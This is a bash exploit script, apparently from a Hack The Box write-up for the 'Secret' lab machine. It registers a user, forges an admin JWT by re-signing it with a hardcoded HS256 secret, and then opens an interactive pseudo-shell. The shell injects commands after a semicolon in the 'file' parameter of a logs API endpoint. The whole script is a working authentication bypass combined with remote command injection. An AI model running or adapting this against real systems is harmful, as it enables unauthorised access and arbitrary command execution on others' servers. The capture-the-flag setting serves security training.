#!/usr/bin/env bash
# Author: Şefik Efe aka f4T1H *** See https://github.com/f4T1H21/HackTheBox-Writeups/tree/main/Boxes/Secret/README.md#RCE.sh

echo -e "[i] Written with <3 by Şefik Efe aka f4T1H
[i] Hack The Box Secret Machine Foothold Exploit
"

url='http://10.10.11.120:3000/api'
ctype='Content-Type: application/json'
time=$(date +%s%N | cut -b1-13)
name=$time
email="root@${time}.com"
passwd='123456'

# Register
echo "[+] Registering low-level user ..."
curl -s -X POST -H "$ctype" -d '{"name":"'$name'", "email":"'$email'", "password":"'$passwd'"}' $url"/user/register" 1>/dev/null

# Login
echo "[+] Getting JWT ..."
jwt=$(curl -s -X POST -H "$ctype" -d '{"email":"'$email'", "password":"'$passwd'"}' $url"/user/login")

# Change name to 'theadmin'
echo "[+] Editing the JWT to become privileged ..."
jwt=$(jq -R '[split(".") | .[0],.[1] | @base64d | fromjson] | .[1].name="theadmin"' <<< $jwt)

# Sign changed token using HS256 algorithm
echo "[+] HS256 signing edited JWT with secret ..."
header=$(jq -c .[0] <<< $jwt)
payload=$(jq -c .[1] <<< $jwt)
alg='HS256'
secret='gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE'

b64enc() { openssl enc -base64 -A | tr '+/' '-_' | tr -d '='; }
json() { jq -c . | LC_CTYPE=C tr -d '\n'; }
hs_sign() { openssl dgst -binary -sha"$1" -hmac "$2"; }

signed_content="$(json <<< $header | b64enc).$(json <<< $payload | b64enc)"
sign=$(printf %s "$signed_content" | hs_sign "${alg#HS}" "$secret" | b64enc)
jwt=$(printf '%s.%s\n' "${signed_content}" "${sign}")

echo -e "[+] Here comes your shell prompt!\n"; sleep 1
while true; do
    # Get command
    read -e -p "[dasith@secret /home/dasith/local-web]$ " cmd

    # URL encode command
    cmd=$(echo -n $cmd | jq -sRr @uri | sed -e "s/'/%27/g")

    # Execute command
    out=$(curl \
             -s \
             -H "auth-token: $jwt" \
             $url"/logs?file=DoesNotExists;%20"$cmd \
             | sed -e 's/^"//g' -e 's/"$//g')

    if ! [[ $out == *'{"killed":false,"code":'*',"signal":null,"cmd":"git log --oneline DoesNotExists;'* ]]; then
        # Print output
        echo -e $out
    fi
done